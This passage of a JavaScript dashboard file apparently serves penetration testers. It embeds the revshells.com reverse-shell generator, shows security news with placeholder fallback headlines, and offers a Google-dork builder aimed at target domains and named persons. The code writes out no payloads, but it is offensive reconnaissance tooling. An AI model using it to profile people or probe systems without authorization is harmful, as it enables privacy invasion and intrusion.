  /* =========================================================
     REVSHELLS WIDGET — revshells.com embedded iframe
     ========================================================= */
  function renderRevShellsWidget(container) {
    const root = document.createElement('div');
    root.className = 'revshells-widget';

    const toolbar = document.createElement('div');
    toolbar.className = 'revshells-toolbar';

    const note = document.createElement('span');
    note.className = 'revshells-note';
    note.textContent = 'revshells.com — live embed';

    const openBtn = document.createElement('button');
    openBtn.className = 'revshells-open-btn';
    openBtn.type = 'button';
    openBtn.title = 'Open in new tab';
    openBtn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg><span>New Tab</span>';
    openBtn.addEventListener('click', () => {
      window.open('https://www.revshells.com/', '_blank', 'noopener,noreferrer');
    });

    const reloadBtn = document.createElement('button');
    reloadBtn.className = 'revshells-reload-btn';
    reloadBtn.type = 'button';
    reloadBtn.title = 'Reload frame';
    reloadBtn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>';

    toolbar.appendChild(note);
    toolbar.appendChild(reloadBtn);
    toolbar.appendChild(openBtn);

    const frameWrap = document.createElement('div');
    frameWrap.className = 'revshells-frame-wrap';

    const iframe = document.createElement('iframe');
    iframe.className = 'revshells-iframe';
    iframe.src = 'https://www.revshells.com/';
    iframe.title = 'RevShells Generator';
    iframe.setAttribute('loading', 'lazy');
    iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-popups-to-escape-sandbox');
    iframe.setAttribute('referrerpolicy', 'no-referrer');
    iframe.setAttribute('allow', '');

    reloadBtn.addEventListener('click', () => {
      iframe.src = iframe.src;
    });

    const overlay = document.createElement('div');
    overlay.className = 'revshells-load-overlay';
    overlay.innerHTML = '<div class="revshells-spinner"></div><span>Loading revshells.com...</span>';

    iframe.addEventListener('load', () => {
      overlay.style.opacity = '0';
      setTimeout(() => { overlay.style.display = 'none'; }, 300);
    });

    frameWrap.appendChild(overlay);
    frameWrap.appendChild(iframe);
    root.appendChild(toolbar);
    root.appendChild(frameWrap);
    container.appendChild(root);
  }

  // ==========================================
  // CYBER & TECH NEWS HEADLINES WIDGET
  // ==========================================
  const TECH_NEWS_FEEDS = {
    all: [
      {
        title: "Critical RCE Flaw Discovered in Popular Open-Source Framework",
        source: "The Hacker News",
        tag: "EXPLOIT",
        tagClass: "tag-red",
        time: "15m ago",
        url: "https://thehackernews.com"
      },
      {
        title: "CISA Adds Active Exploited Zero-Day to Known Vulnerabilities Catalog",
        source: "CISA Advisory",
        tag: "ZERO-DAY",
        tagClass: "tag-orange",
        time: "42m ago",
        url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
      },
      {
        title: "New Ransomware Variant Targeting Enterprise Cloud Infrastructure",
        source: "BleepingComputer",
        tag: "RANSOM",
        tagClass: "tag-red",
        time: "1h ago",
        url: "https://www.bleepingcomputer.com"
      },
      {
        title: "Linux Kernel Memory Safety Patch Released for High Severity CVE",
        source: "SecurityWeek",
        tag: "PATCH",
        tagClass: "tag-blue",
        time: "2h ago",
        url: "https://www.securityweek.com"
      },
      {
        title: "Show HN: Open Source Subdomain Enumerator and HTTP Probe Tool",
        source: "Hacker News",
        tag: "TOOL",
        tagClass: "tag-green",
        time: "3h ago",
        url: "https://news.ycombinator.com"
      },
      {
        title: "WAF Bypass Technique Uncovered in Web Application Firewalls",
        source: "Dark Reading",
        tag: "BYPASS",
        tagClass: "tag-purple",
        time: "4h ago",
        url: "https://www.darkreading.com"
      }
    ],
    hn: [
      {
        title: "Show HN: Fast WebAssembly Port Scanner for Browser Penetration Testing",
        source: "Hacker News",
        tag: "HN",
        tagClass: "tag-orange",
        time: "28m ago",
        url: "https://news.ycombinator.com"
      },
      {
        title: "Ask HN: What are your favorite self-hosted security monitoring tools?",
        source: "Hacker News",
        tag: "HN",
        tagClass: "tag-orange",
        time: "1h ago",
        url: "https://news.ycombinator.com"
      },
      {
        title: "Analysis of Modern Memory Safe Languages in Low-Level Systems",
        source: "Hacker News",
        tag: "HN",
        tagClass: "tag-orange",
        time: "3h ago",
        url: "https://news.ycombinator.com"
      },
      {
        title: "Reverse Engineering Hardware Protocols with Logic Analyzers",
        source: "Hacker News",
        tag: "HN",
        tagClass: "tag-orange",
        time: "5h ago",
        url: "https://news.ycombinator.com"
      }
    ],
    bleeping: [
      {
        title: "New Infostealer Malware Spreading via Malicious Search Ads",
        source: "BleepingComputer",
        tag: "MALWARE",
        tagClass: "tag-red",
        time: "20m ago",
        url: "https://www.bleepingcomputer.com"
      },
      {
        title: "Major Network Vendor Urges Users to Patch Flaw Under Active Attack",
        source: "BleepingComputer",
        tag: "VULN",
        tagClass: "tag-orange",
        time: "1h ago",
        url: "https://www.bleepingcomputer.com"
      },
      {
        title: "FBI Warns of Increasing Social Engineering Attacks on IT Helpdesks",
        source: "BleepingComputer",
        tag: "ADVISORY",
        tagClass: "tag-blue",
        time: "3h ago",
        url: "https://www.bleepingcomputer.com"
      }
    ],
    thehackernews: [
      {
        title: "Unauthenticated API Endpoint Exposes Sensitive User Data in SaaS Apps",
        source: "The Hacker News",
        tag: "API",
        tagClass: "tag-purple",
        time: "10m ago",
        url: "https://thehackernews.com"
      },
      {
        title: "Researchers Break Down Complex Supply Chain Attack Vector",
        source: "The Hacker News",
        tag: "SUPPLY-CHAIN",
        tagClass: "tag-orange",
        time: "2h ago",
        url: "https://thehackernews.com"
      },
      {
        title: "New Stealthy Rootkit Hides via Undocumented OS Kernel Interfaces",
        source: "The Hacker News",
        tag: "ROOTKIT",
        tagClass: "tag-red",
        time: "4h ago",
        url: "https://thehackernews.com"
      }
    ]
  };

  function renderTechNewsWidget(container) {
    const refreshSvg = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/></svg>';
    
    container.innerHTML = `
      <div class="technews-widget">
        <div class="technews-toolbar">
          <div class="technews-tabs">
            <button class="technews-tab active" data-source="all">Top Security</button>
            <button class="technews-tab" data-source="hn">Hacker News</button>
            <button class="technews-tab" data-source="bleeping">BleepingComputer</button>
            <button class="technews-tab" data-source="thehackernews">THN</button>
          </div>
          <button class="technews-refresh-btn" type="button" title="Fetch latest headlines">
            ${refreshSvg}
          </button>
        </div>

        <div class="technews-list-scroll">
          <!-- Rendered dynamically -->
        </div>
      </div>
    `;

    const scrollEl = container.querySelector('.technews-list-scroll');
    const tabs = container.querySelectorAll('.technews-tab');
    const refreshBtn = container.querySelector('.technews-refresh-btn');
    let activeFeed = 'all';

    async function fetchLiveHN() {
      try {
        const res = await fetch('https://hacker-news.firebaseio.com/v0/topstories.json');
        const ids = await res.json();
        const topIds = ids.slice(0, 8);
        const itemPromises = topIds.map(id => fetch(`https://hacker-news.firebaseio.com/v0/item/${id}.json`).then(r => r.json()));
        const items = await Promise.all(itemPromises);
        return items.filter(Boolean).map(item => ({
          title: item.title,
          source: 'Hacker News Live',
          tag: 'HN LIVE',
          tagClass: 'tag-orange',
          time: calculateTimeAgo(item.time),
          url: item.url || `https://news.ycombinator.com/item?id=${item.id}`
        }));
      } catch (e) {
        return TECH_NEWS_FEEDS.hn;
      }
    }

    async function fetchLiveRSS(rssUrl, defaultTag, defaultClass, fallbackKey) {
      try {
        const res = await fetch(`https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssUrl)}`);
        const data = await res.json();
        if (data && data.status === 'ok' && data.items && data.items.length > 0) {
          return data.items.slice(0, 8).map(item => {
            const pubDate = item.pubDate ? new Date(item.pubDate).getTime() / 1000 : null;
            return {
              title: item.title,
              source: data.feed.title ? data.feed.title.replace(' - Technical Security News', '').replace('Feed', '').trim() : 'Live News',
              tag: defaultTag,
              tagClass: defaultClass,
              time: calculateTimeAgo(pubDate),
              url: item.link || item.guid
            };
          });
        }
      } catch (e) {
        // Fallback to offline static feed
      }
      return TECH_NEWS_FEEDS[fallbackKey];
    }

    function calculateTimeAgo(timestamp) {
      if (!timestamp) return 'Recently';
      const elapsed = Math.floor(Date.now() / 1000 - timestamp);
      if (elapsed < 3600) return `${Math.max(1, Math.floor(elapsed / 60))}m ago`;
      if (elapsed < 86400) return `${Math.floor(elapsed / 3600)}h ago`;
      return `${Math.floor(elapsed / 86400)}d ago`;
    }

    async function renderFeed(feedKey, isRefreshing = false) {
      if (!scrollEl) return;
      activeFeed = feedKey;

      if (isRefreshing) {
        scrollEl.innerHTML = `
          <div class="technews-loading">
            <div class="technews-spinner"></div>
            <span>Fetching live security headlines...</span>
          </div>
        `;
      }

      let items = TECH_NEWS_FEEDS[feedKey] || TECH_NEWS_FEEDS.all;

      if (window.navigator.onLine) {
        if (feedKey === 'hn') {
          const liveHN = await fetchLiveHN();
          if (liveHN && liveHN.length > 0) items = liveHN;
        } else if (feedKey === 'bleeping') {
          const liveBleeping = await fetchLiveRSS('https://www.bleepingcomputer.com/feed/', 'BLEEPING', 'tag-red', 'bleeping');
          if (liveBleeping && liveBleeping.length > 0) items = liveBleeping;
        } else if (feedKey === 'thehackernews') {
          const liveTHN = await fetchLiveRSS('https://feeds.feedburner.com/TheHackersNews', 'THN LIVE', 'tag-purple', 'thehackernews');
          if (liveTHN && liveTHN.length > 0) items = liveTHN;
        } else if (feedKey === 'all') {
          const liveBleeping = await fetchLiveRSS('https://www.bleepingcomputer.com/feed/', 'LIVE', 'tag-red', 'all');
          if (liveBleeping && liveBleeping.length > 0) items = liveBleeping;
        }
      }

      if (isRefreshing) {
        setTimeout(() => populateList(items), 350);
      } else {
        populateList(items);
      }
    }

    function populateList(items) {
      if (!scrollEl) return;
      scrollEl.innerHTML = items.map(item => `
        <a href="${item.url}" target="_blank" rel="noreferrer" class="technews-item">
          <div class="technews-item-main">
            <span class="technews-item-title">${escapeHtml(item.title)}</span>
            <div class="technews-item-meta">
              <span class="news-tag ${item.tagClass}">${item.tag}</span>
              <span class="news-source">${escapeHtml(item.source)}</span>
              <span class="news-dot">•</span>
              <span class="news-time">${item.time}</span>
            </div>
          </div>
          <svg class="news-external-icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
        </a>
      `).join('');
    }

    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        renderFeed(tab.dataset.source, false);
      });
    });

    if (refreshBtn) {
      refreshBtn.addEventListener('click', () => {
        refreshBtn.classList.add('is-spinning');
        renderFeed(activeFeed, true);
        setTimeout(() => refreshBtn.classList.remove('is-spinning'), 650);
      });
    }

    renderFeed('all', false);
  }

  // Modal & Management Actions
  function setupAddWidgetModal() {
    if (!addModal) return;

    const openBtn = document.getElementById('open-add-widget-btn');
    const closeBtn = document.getElementById('close-add-widget-btn');
    const catalogList = document.getElementById('add-widget-catalog');

    if (openBtn) {
      openBtn.addEventListener('click', () => {
        populateAddWidgetCatalog(catalogList);
        addModal.classList.add('active');
      });
    }

    if (closeBtn) {
      closeBtn.addEventListener('click', () => {
        addModal.classList.remove('active');
      });
    }

    addModal.addEventListener('click', (e) => {
      if (e.target === addModal) {
        addModal.classList.remove('active');
      }
    });
  }

  function populateAddWidgetCatalog(container, targetPos = null) {
    if (!container) return;
    container.innerHTML = '';

    Object.values(WIDGET_CATALOG).forEach(item => {
      const isActive = activeWidgets.includes(item.id);
      const row = document.createElement('div');
      row.className = `catalog-item ${isActive ? 'is-active' : ''}`;
      row.innerHTML = `
        <div class="catalog-info">
          <h4 class="catalog-title">${item.title}</h4>
          <p class="catalog-desc">${item.description}</p>
        </div>
        <div class="catalog-action">
          <button class="catalog-toggle-btn ${isActive ? 'btn-remove' : 'btn-add'}">
            ${isActive ? 'Remove' : '+ Add'}
          </button>
        </div>
      `;

      const btn = row.querySelector('.catalog-toggle-btn');
      btn.addEventListener('click', () => {
        if (isActive) {
          removeWidget(item.id);
        } else {
          addWidget(item.id, targetPos);
        }
        populateAddWidgetCatalog(container, targetPos);
      });

      container.appendChild(row);
    });
  }

  async function addWidget(widgetId, targetPos = null) {
    if (!activeWidgets.includes(widgetId)) {
      activeWidgets.push(widgetId);
      widgetPositions[widgetId] = targetPos ? normalizePosition(widgetId, targetPos) : findFirstAvailableSlot(widgetId);
      await StorageService.set('activeWidgets', activeWidgets);
      await StorageService.set('widgetPositions', widgetPositions);
      renderGrid();
    }
  }

  async function removeWidget(widgetId) {
    activeWidgets = activeWidgets.filter(id => id !== widgetId);
    delete widgetPositions[widgetId];
    if (selectedCardId === widgetId) {
      selectedCardId = null;
    }
    await StorageService.set('activeWidgets', activeWidgets);
    await StorageService.set('widgetPositions', widgetPositions);
    renderGrid();
  }

  async function moveWidget(fromIndex, toIndex) {
    if (toIndex < 0 || toIndex >= activeWidgets.length) return;
    const temp = activeWidgets[fromIndex];
    activeWidgets[fromIndex] = activeWidgets[toIndex];
    activeWidgets[toIndex] = temp;
    await StorageService.set('activeWidgets', activeWidgets);
    renderGrid();
  }

  // Close open size menus when clicking outside
  document.addEventListener('click', (e) => {
    if (!e.target.closest('.widget-resize-wrapper')) {
      document.querySelectorAll('.widget-size-menu.active').forEach(m => {
        m.classList.remove('active');
        m.closest('.widget-card')?.classList.remove('is-active-menu');
      });
    }
  });

  async function resetLayout() {
    activeWidgets = ['identity', 'clock', 'date', 'quotes'];
    widgetSizes = {};
    widgetPositions = {};
    selectedCardId = null;
    ensureAllWidgetPositions();
    await StorageService.set('activeWidgets', activeWidgets);
    await StorageService.set('widgetSizes', widgetSizes);
    await StorageService.set('widgetPositions', widgetPositions);
    renderGrid();
  }

  function updateSettings(newSettings) {
    userSettings = { ...userSettings, ...newSettings };
    renderGrid();
  }

  /* 20. GOOGLE DORKS & OSINT RECON WIDGET */
  async function renderGoogleDorksWidget(container) {
    if (typeof DorkService !== 'undefined') {
      await DorkService.init();
    }
    
    let scopeDomain = typeof DorkService !== 'undefined' ? DorkService.getScopeDomain() : 'example.com';
    let targetPerson = typeof DorkService !== 'undefined' ? DorkService.getPersonTarget() : 'John Doe';
    let targetHandle = typeof DorkService !== 'undefined' ? DorkService.getHandleTarget() : 'johndoe';
    let activeCat = 'all';
    let currentQuery = `site:${scopeDomain}`;

    container.innerHTML = `
      <div class="googledorks-widget-container">
        <!-- Top bar: Scope & Full Builder -->
        <div class="dorks-w-topbar">
          <div class="dorks-w-scope-group">
            <span class="dorks-w-label">SCOPE:</span>
            <input type="text" class="dorks-w-scope-input" value="${escapeHtml(scopeDomain)}" placeholder="domain.com" spellcheck="false" autocomplete="off" title="Target assessment domain">
          </div>
          <div class="dorks-w-scope-group">
            <span class="dorks-w-label">PERSON:</span>
            <input type="text" class="dorks-w-person-input" value="${escapeHtml(targetPerson)}" placeholder="Target Name" spellcheck="false" autocomplete="off" title="Target Person Name">
          </div>
          <button class="dorks-w-builder-btn" type="button" title="Open complete Dork Builder (/dorkui)">
            <span>BUILDER</span>
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
          </button>
        </div>

        <!-- Category Tabs -->
        <div class="dorks-w-cat-tabs">
          <button class="dork-w-tab active" type="button" data-cat="all">All</button>
          <button class="dork-w-tab" type="button" data-cat="person">Person</button>
          <button class="dork-w-tab" type="button" data-cat="recon">Recon</button>
          <button class="dork-w-tab" type="button" data-cat="docs">Docs</button>
          <button class="dork-w-tab" type="button" data-cat="auth">Auth</button>
          <button class="dork-w-tab" type="button" data-cat="security">Misconfig</button>
          <button class="dork-w-tab" type="button" data-cat="vulns">Vulns</button>
        </div>

        <!-- Template Selector Dropdown & Operators -->
        <div class="dorks-w-controls-row">
          <select class="dorks-w-template-select form-select" title="Choose dork template">
            <!-- Injected -->
          </select>
          <div class="dorks-w-mini-chips">
            <button class="dork-mini-chip" type="button" data-op="site:">site:</button>
            <button class="dork-mini-chip" type="button" data-op="filetype:">filetype:</button>
            <button class="dork-mini-chip" type="button" data-op="inurl:">inurl:</button>
            <button class="dork-mini-chip" type="button" data-op="intitle:">intitle:</button>
            <button class="dork-mini-chip" type="button" data-op="intext:">intext:</button>
            <button class="dork-mini-chip" type="button" data-op="OR">OR</button>
            <button class="dork-mini-chip" type="button" data-op='"{PERSON}"'>"{PERSON}"</button>
            <button class="dork-mini-chip" type="button" data-op='"{HANDLE}"'>"{HANDLE}"</button>
          </div>
        </div>

        <!-- Query input / preview -->
        <div class="dorks-w-query-row">
          <input type="text" class="dorks-w-query-input" value="${escapeHtml(currentQuery)}" placeholder="Search dork..." spellcheck="false" autocomplete="off">
        </div>

        <!-- Actions: Copy & Search Google -->
        <div class="dorks-w-actions">
          <div class="dorks-w-links-left">
            <a href="https://whatsmyname.app" target="_blank" rel="noreferrer" class="dorks-w-ghdb-link" title="Open WhatsMyName Handle Enumerator">WhatsMyName ↗</a>
            <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noreferrer" class="dorks-w-ghdb-link" title="Open Google Hacking Database">GHDB ↗</a>
          </div>
          <div class="dorks-w-btn-group">
            <button class="dorks-w-copy-btn btn-secondary-xs" type="button" title="Copy query to clipboard">Copy</button>
            <button class="dorks-w-launch-btn btn-action-primary-xs" type="button" title="Search Google in new tab">Search Google ↗</button>
          </div>
        </div>
      </div>
    `;

    // DOM Elements
    const scopeInput = container.querySelector('.dorks-w-scope-input');
    const personInput = container.querySelector('.dorks-w-person-input');
    const builderBtn = container.querySelector('.dorks-w-builder-btn');
    const catTabs = container.querySelectorAll('.dork-w-tab');
    const templateSelect = container.querySelector('.dorks-w-template-select');
    const miniChips = container.querySelectorAll('.dork-mini-chip');
    const queryInput = container.querySelector('.dorks-w-query-input');
    const copyBtn = container.querySelector('.dorks-w-copy-btn');
    const launchBtn = container.querySelector('.dorks-w-launch-btn');

    function populateTemplates() {
      if (typeof DorkService === 'undefined') return;
      const all = DorkService.getAllTemplates();
      const filtered = activeCat === 'all' ? all : all.filter(t => t.category === activeCat);
      templateSelect.innerHTML = '<option value="">-- Quick Dork Template --</option>';
      filtered.forEach(t => {
        const opt = document.createElement('option');
        opt.value = t.query;
        opt.textContent = `${t.title} (${t.categoryLabel || t.category})`;
        templateSelect.appendChild(opt);
      });
    }

    populateTemplates();

    // Scope input change
    scopeInput.addEventListener('change', async (e) => {
      e.stopPropagation();
      if (typeof DorkService !== 'undefined') {
        scopeDomain = await DorkService.setScopeDomain(e.target.value);
        scopeInput.value = scopeDomain;
        queryInput.value = DorkService.compileQuery(queryInput.value, scopeDomain, targetPerson, targetHandle);
      }
    });

    // Person input change
    personInput.addEventListener('change', async (e) => {
      e.stopPropagation();
      if (typeof DorkService !== 'undefined') {
        targetPerson = await DorkService.setPersonTarget(e.target.value);
        personInput.value = targetPerson;
        queryInput.value = DorkService.compileQuery(queryInput.value, scopeDomain, targetPerson, targetHandle);
      }
    });

    // Builder button -> Open Modal
    builderBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (typeof window.openDorkBuilderModal === 'function') {
        window.openDorkBuilderModal(queryInput.value, activeCat === 'person' ? 'person' : '');
      }
    });

    // Tabs
    catTabs.forEach(tab => {
      tab.addEventListener('click', (e) => {
        e.stopPropagation();
        catTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        activeCat = tab.dataset.cat;
        populateTemplates();
      });
    });

    // Template select
    templateSelect.addEventListener('change', (e) => {
      e.stopPropagation();
      if (e.target.value && typeof DorkService !== 'undefined') {
        queryInput.value = DorkService.compileQuery(e.target.value, scopeDomain, targetPerson, targetHandle);
      }
    });

    // Mini operator chips
    miniChips.forEach(chip => {
      chip.addEventListener('click', (e) => {
        e.stopPropagation();
        const op = chip.dataset.op;
        const cur = queryInput.value.trim();
        queryInput.value = cur ? `${cur} ${op}` : op;
        queryInput.focus();
      });
    });

    // Copy action
    copyBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const q = queryInput.value.trim();
      if (q) {
        navigator.clipboard.writeText(q);
        copyBtn.textContent = 'COPIED';
        setTimeout(() => { copyBtn.textContent = 'Copy'; }, 1200);
      }
    });

    // Launch action
    launchBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const q = queryInput.value.trim();
      if (q && typeof DorkService !== 'undefined') {
        DorkService.openGoogleDork(q, scopeDomain);
      }
    });
  }

  function escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  return {
    init,
    addWidget,
    removeWidget,
    moveWidget,
    setWidgetPosition,
    nudgeWidget,
    setWidgetDimension,
    cycleNextSize,
    resetLayout,
    compactLayout,
    toggleArrangeMode,
    isArrangeMode: () => isArrangeMode,
    updateSettings,
    getActiveWidgets: () => [...activeWidgets],
    getWidgetPositions: () => ({ ...widgetPositions })
  };
})();

if (typeof module !== 'undefined' && module.exports) {
  module.exports = WidgetsManager;
}
